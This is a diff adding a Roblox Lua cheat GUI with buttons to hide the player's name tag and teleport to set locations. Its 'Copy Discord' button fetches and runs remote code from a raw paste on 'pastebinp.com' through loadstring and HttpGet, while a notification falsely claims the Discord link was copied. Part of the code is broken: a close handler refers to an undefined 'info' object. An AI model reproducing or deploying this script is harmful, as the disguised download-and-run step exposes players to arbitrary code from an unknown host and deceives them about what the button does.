@@ -1,0 +1,492 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local BTF = Instance.new("ScreenGui")
+local Pages = Instance.new("Frame")
+local Main = Instance.new("Frame")
+local Hub = Instance.new("Frame")
+local UIGridLayout = Instance.new("UIGridLayout")
+local HideName = Instance.new("TextButton")
+local UIPadding = Instance.new("UIPadding")
+local MIT = Instance.new("TextButton")
+local Spawn = Instance.new("TextButton")
+local Rainbow = Instance.new("Frame")
+local Name = Instance.new("TextLabel")
+local CloseOpen = Instance.new("TextButton")
+local Credits = Instance.new("Frame")
+local Hub_2 = Instance.new("Frame")
+local UIGridLayout_2 = Instance.new("UIGridLayout")
+local UIPadding_2 = Instance.new("UIPadding")
+local ADiscord = Instance.new("TextButton")
+local GuiBy = Instance.new("TextLabel")
+local DesignBy = Instance.new("TextLabel")
+local ScriptBy = Instance.new("TextLabel")
+local Rainbow_2 = Instance.new("Frame")
+local Name_2 = Instance.new("TextLabel")
+local CloseOpen_2 = Instance.new("TextButton")
+
+--Properties:
+
+BTF.Name = "BTF"
+BTF.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+BTF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+BTF.ResetOnSpawn = false
+
+Pages.Name = "Pages"
+Pages.Parent = BTF
+Pages.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Pages.BackgroundTransparency = 1.000
+Pages.Size = UDim2.new(0, 100, 0, 100)
+Pages.ZIndex = 1000000000
+
+Main.Name = "Main"
+Main.Parent = Pages
+Main.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Main.Position = UDim2.new(0.700000167, 0, 0.389999866, 0)
+Main.Size = UDim2.new(0, 195, 0, 30)
+
+Hub.Name = "Hub"
+Hub.Parent = Main
+Hub.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Hub.Position = UDim2.new(0, 0, 1.0666672, 0)
+Hub.Size = UDim2.new(0, 195, 0, 94)
+
+UIGridLayout.Parent = Hub
+UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout.CellSize = UDim2.new(0, 180, 0, 25)
+
+HideName.Name = "HideName"
+HideName.Parent = Hub
+HideName.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+HideName.BorderColor3 = Color3.fromRGB(0, 0, 0)
+HideName.Position = UDim2.new(-0.550256431, 0, 1.0558728, 0)
+HideName.Size = UDim2.new(0, 200, 0, 50)
+HideName.Font = Enum.Font.SourceSansSemibold
+HideName.Text = "Hide Name"
+HideName.TextColor3 = Color3.fromRGB(255, 255, 255)
+HideName.TextSize = 17.000
+
+UIPadding.Parent = Hub
+UIPadding.PaddingBottom = UDim.new(0, 5)
+UIPadding.PaddingLeft = UDim.new(0, 5)
+UIPadding.PaddingRight = UDim.new(0, 5)
+UIPadding.PaddingTop = UDim.new(0, 5)
+
+MIT.Name = "MIT"
+MIT.Parent = Hub
+MIT.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+MIT.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MIT.Position = UDim2.new(-0.550256431, 0, 1.0558728, 0)
+MIT.Size = UDim2.new(0, 200, 0, 50)
+MIT.Font = Enum.Font.SourceSansSemibold
+MIT.Text = "TP to MIT Base"
+MIT.TextColor3 = Color3.fromRGB(255, 255, 255)
+MIT.TextSize = 17.000
+
+Spawn.Name = "Spawn"
+Spawn.Parent = Hub
+Spawn.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Spawn.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Spawn.Position = UDim2.new(-0.550256431, 0, 1.0558728, 0)
+Spawn.Size = UDim2.new(0, 200, 0, 50)
+Spawn.Font = Enum.Font.SourceSansSemibold
+Spawn.Text = "TP to Spawn"
+Spawn.TextColor3 = Color3.fromRGB(255, 255, 255)
+Spawn.TextSize = 17.000
+
+Rainbow.Name = "Rainbow"
+Rainbow.Parent = Main
+Rainbow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow.BorderSizePixel = 0
+Rainbow.Position = UDim2.new(0, 0, 1, 0)
+Rainbow.Size = UDim2.new(0, 195, 0, 2)
+
+Name.Name = "Name"
+Name.Parent = Main
+Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Name.BackgroundTransparency = 1.000
+Name.Position = UDim2.new(0.189225882, 0, 0, 0)
+Name.Size = UDim2.new(0, 120, 0, 30)
+Name.Font = Enum.Font.SourceSansSemibold
+Name.Text = "Main"
+Name.TextColor3 = Color3.fromRGB(255, 255, 255)
+Name.TextScaled = true
+Name.TextSize = 14.000
+Name.TextWrapped = true
+
+CloseOpen.Name = "Close/Open"
+CloseOpen.Parent = Main
+CloseOpen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen.BackgroundTransparency = 1.000
+CloseOpen.Position = UDim2.new(0.843177199, 0, 0, 0)
+CloseOpen.Size = UDim2.new(0, 30, 0, 30)
+CloseOpen.Font = Enum.Font.SourceSans
+CloseOpen.Text = "-"
+CloseOpen.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen.TextScaled = true
+CloseOpen.TextSize = 14.000
+CloseOpen.TextWrapped = true
+
+Credits.Name = "Credits"
+Credits.Parent = Pages
+Credits.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Credits.Position = UDim2.new(2.93000007, 0, 0.379999995, 0)
+Credits.Size = UDim2.new(0, 195, 0, 30)
+
+Hub_2.Name = "Hub"
+Hub_2.Parent = Credits
+Hub_2.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Hub_2.Position = UDim2.new(0, 0, 1.06666672, 0)
+Hub_2.Size = UDim2.new(0, 195, 0, 126)
+
+UIGridLayout_2.Parent = Hub_2
+UIGridLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout_2.CellSize = UDim2.new(0, 180, 0, 25)
+
+UIPadding_2.Parent = Hub_2
+UIPadding_2.PaddingBottom = UDim.new(0, 5)
+UIPadding_2.PaddingLeft = UDim.new(0, 5)
+UIPadding_2.PaddingRight = UDim.new(0, 5)
+UIPadding_2.PaddingTop = UDim.new(0, 5)
+
+ADiscord.Name = "ADiscord"
+ADiscord.Parent = Hub_2
+ADiscord.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+ADiscord.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ADiscord.Position = UDim2.new(-0.00666666683, 0, -0.0411984995, 0)
+ADiscord.Size = UDim2.new(0, 200, 0, 50)
+ADiscord.Font = Enum.Font.SourceSansSemibold
+ADiscord.Text = "Copy Discord"
+ADiscord.TextColor3 = Color3.fromRGB(255, 255, 255)
+ADiscord.TextSize = 17.000
+
+GuiBy.Name = "GuiBy"
+GuiBy.Parent = Hub_2
+GuiBy.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+GuiBy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+GuiBy.Size = UDim2.new(0, 200, 0, 50)
+GuiBy.Font = Enum.Font.SourceSansSemibold
+GuiBy.Text = "Gui by Nems1337"
+GuiBy.TextColor3 = Color3.fromRGB(255, 255, 255)
+GuiBy.TextSize = 17.000
+
+DesignBy.Name = "DesignBy"
+DesignBy.Parent = Hub_2
+DesignBy.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+DesignBy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+DesignBy.Size = UDim2.new(0, 200, 0, 50)
+DesignBy.Font = Enum.Font.SourceSansSemibold
+DesignBy.Text = "Design by Nems1337"
+DesignBy.TextColor3 = Color3.fromRGB(255, 255, 255)
+DesignBy.TextSize = 17.000
+
+ScriptBy.Name = "ScriptBy"
+ScriptBy.Parent = Hub_2
+ScriptBy.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+ScriptBy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScriptBy.Size = UDim2.new(0, 200, 0, 50)
+ScriptBy.Font = Enum.Font.SourceSansSemibold
+ScriptBy.Text = "Gui scripts by Nems1337"
+ScriptBy.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScriptBy.TextSize = 17.000
+
+Rainbow_2.Name = "Rainbow"
+Rainbow_2.Parent = Credits
+Rainbow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow_2.BorderSizePixel = 0
+Rainbow_2.Position = UDim2.new(0, 0, 1, 0)
+Rainbow_2.Size = UDim2.new(0, 195, 0, 2)
+
+Name_2.Name = "Name"
+Name_2.Parent = Credits
+Name_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Name_2.BackgroundTransparency = 1.000
+Name_2.Position = UDim2.new(0.189225882, 0, 0, 0)
+Name_2.Size = UDim2.new(0, 120, 0, 30)
+Name_2.Font = Enum.Font.SourceSansSemibold
+Name_2.Text = "Credits"
+Name_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Name_2.TextScaled = true
+Name_2.TextSize = 14.000
+Name_2.TextWrapped = true
+
+CloseOpen_2.Name = "Close/Open"
+CloseOpen_2.Parent = Credits
+CloseOpen_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen_2.BackgroundTransparency = 1.000
+CloseOpen_2.Position = UDim2.new(0.843177199, 0, 0, 0)
+CloseOpen_2.Size = UDim2.new(0, 30, 0, 30)
+CloseOpen_2.Font = Enum.Font.SourceSans
+CloseOpen_2.Text = "-"
+CloseOpen_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen_2.TextScaled = true
+CloseOpen_2.TextSize = 14.000
+CloseOpen_2.TextWrapped = true
+
+-- Scripts:
+
+local function JTIESA_fake_script() -- Pages.Toggle 
+	local script = Instance.new('LocalScript', Pages)
+
+	function PopupGui()
+	if script.Parent.Visible==true then script.Parent.Visible=false
+	else script.Parent.Visible=true
+	end
+	end
+	
+	
+	game:GetService("UserInputService").InputBegan:Connect(function(key)
+	if key.KeyCode==Enum.KeyCode.RightControl then
+	PopupGui()
+	end
+	end)
+end
+coroutine.wrap(JTIESA_fake_script)()
+local function OBSTF_fake_script() -- HideName.Script 
+	local script = Instance.new('Script', HideName)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		game:GetService("Players").LocalPlayer.Character.Head.NameTag:Destroy()
+		while wait() do
+			if game:GetService("Players").LocalPlayer.Character.Humanoid.Health <= 0 then
+				wait(6)
+				game:GetService("Players").LocalPlayer.Character.Head.NameTag:Destroy()
+			end
+		end
+	end)
+end
+coroutine.wrap(OBSTF_fake_script)()
+local function AIKZ_fake_script() -- MIT.Script 
+	local script = Instance.new('Script', MIT)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1358, 195, 3335)
+	end)
+end
+coroutine.wrap(AIKZ_fake_script)()
+local function YKXO_fake_script() -- Spawn.Script 
+	local script = Instance.new('Script', Spawn)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3892, 295, -689)
+	end)
+end
+coroutine.wrap(YKXO_fake_script)()
+local function TIQRYX_fake_script() -- Rainbow.RainbowFunction 
+	local script = Instance.new('LocalScript', Rainbow)
+
+	while true do 
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(i, 0, n)
+	wait() 
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(n, i, 0)
+	wait()
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(0, n, i)
+	wait() 
+	end 
+	end
+end
+coroutine.wrap(TIQRYX_fake_script)()
+local function KHRWHOV_fake_script() -- CloseOpen.Script 
+	local script = Instance.new('Script', CloseOpen)
+
+	local hub = script.Parent.Parent.Hub
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	if hub.Visible==true then button.Text="+" hub.Visible=false
+	else hub.Visible=true button.Text="-"
+	end
+	end)
+end
+coroutine.wrap(KHRWHOV_fake_script)()
+local function SRZHQZ_fake_script() -- Main.Dragify 
+	local script = Instance.new('LocalScript', Main)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame,HoverFrames)
+	    local dragToggle = nil
+	    local dragSpeed = -math.huge
+	    local dragInput = nil
+	    local dragStart = nil
+		local dragPos = nil
+		local startPos = Frame.Position
+		local hoverFrm = nil
+		local function updateInput(input)
+			local Delta = input.Position - dragStart
+			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+			local distance = (startPos.X.Offset - Position.X.Offset) + (startPos.Y.Offset - Position.Y.Offset)
+			--game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+			game:GetService("TweenService"):Create(Frame, TweenInfo.new(distance / (dragSpeed*-300)), {Position = Position}):Play()
+		end
+		if HoverFrames then
+			hoverFrm = HoverFrames
+			for i,v in ipairs(hoverFrm) do
+				v.InputBegan:Connect(function(input)
+					if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+						dragToggle = true
+						dragStart = input.Position
+						startPos = Frame.Position
+						input.Changed:Connect(function()
+							if input.UserInputState == Enum.UserInputState.End then
+								dragToggle = false
+							end
+						end)
+					end
+				end)
+				v.InputChanged:Connect(function(input)
+					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+						dragInput = input
+					end
+				end)
+			end
+		else
+			hoverFrm = Frame
+			hoverFrm.InputBegan:Connect(function(input)
+				if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+					dragToggle = true
+					dragStart = input.Position
+					startPos = Frame.Position
+					input.Changed:Connect(function()
+						if input.UserInputState == Enum.UserInputState.End then
+							dragToggle = false
+						end
+					end)
+				end
+			end)
+			hoverFrm.InputChanged:Connect(function(input)
+				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+					dragInput = input
+				end
+			end)
+		end
+		
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent,{script.Parent})
+end
+coroutine.wrap(SRZHQZ_fake_script)()
+local function UVNS_fake_script() -- ADiscord.Script 
+	local script = Instance.new('Script', ADiscord)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebinp.com/raw/TwyyG5mJ", true))()
+	end)
+end
+coroutine.wrap(UVNS_fake_script)()
+local function QTCWWT_fake_script() -- ADiscord.Message 
+	local script = Instance.new('LocalScript', ADiscord)
+
+	local StarterGui = game:GetService("StarterGui")
+	local button = script.Parent
+	
+	local Notifications = {
+		"Notification Message 1",
+	}
+	
+	local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+	
+	button.MouseButton1Click:Connect(function()
+		for i = 1, #Notifications do
+			local Notification = Notifications[i]
+				
+			StarterGui:SetCore("SendNotification", {
+				Title = "Discord";
+				Text = "Coppied discord to clipboard!";
+				Icon = "rbxassetid://1734216532";
+				Duration = 5;
+			})
+				
+			wait(TimeBetweenNotifications)
+		end
+	end)
+end
+coroutine.wrap(QTCWWT_fake_script)()
+local function FQNM_fake_script() -- Rainbow_2.RainbowFunction 
+	local script = Instance.new('LocalScript', Rainbow_2)
+
+	while true do 
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(i, 0, n)
+	wait() 
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(n, i, 0)
+	wait()
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(0, n, i)
+	wait() 
+	end 
+	end
+end
+coroutine.wrap(FQNM_fake_script)()
+local function SVBZEF_fake_script() -- CloseOpen_2.Script 
+	local script = Instance.new('Script', CloseOpen_2)
+
+	local hub = script.Parent.Parent.Hub
+	local button = script.Parent
+	local info = script.Parent.Parent.info
+	
+	button.MouseButton1Click:Connect(function()
+	if hub.Visible==true then button.Text="+" hub.Visible=false info.Visible=false
+	else hub.Visible=true button.Text="-" info.Visible=true
+	end
+	end)
+end
+coroutine.wrap(SVBZEF_fake_script)()
+local function UIDFMA_fake_script() -- BTF.Message 
+	local script = Instance.new('LocalScript', BTF)
+
+	local StarterGui = game:GetService("StarterGui")
+	
+	local Notifications = {
+		"Notification Message 1",
+	}
+	
+	local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+	
+	for i = 1, #Notifications do
+		local Notification = Notifications[i]
+			
+		StarterGui:SetCore("SendNotification", {
+			Title = "Loaded!";
+			Text = "Press RightCTRL to toggle the gui!";
+			Duration = 7;
+		})
+			
+		wait(TimeBetweenNotifications)
+	end
+end
+coroutine.wrap(UIDFMA_fake_script)()
